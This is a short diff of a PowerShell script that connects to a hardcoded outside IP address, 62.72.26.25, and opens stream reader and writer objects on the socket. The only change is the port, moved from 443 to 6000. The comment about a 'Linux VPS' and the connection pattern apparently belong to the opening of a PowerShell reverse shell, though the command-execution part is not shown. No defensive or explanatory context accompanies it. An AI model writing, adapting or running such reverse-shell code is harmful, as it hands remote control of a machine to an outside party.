@@ -1,5 +1,5 @@
 # Establish a TCP connection to your Linux VPS
-$client = New-Object System.Net.Sockets.TCPClient("62.72.26.25", 443);
+$client = New-Object System.Net.Sockets.TCPClient("62.72.26.25", 6000);
 $stream = $client.GetStream();
 $writer = new-object System.IO.StreamWriter($stream);
 $reader = new-object System.IO.StreamReader($stream);
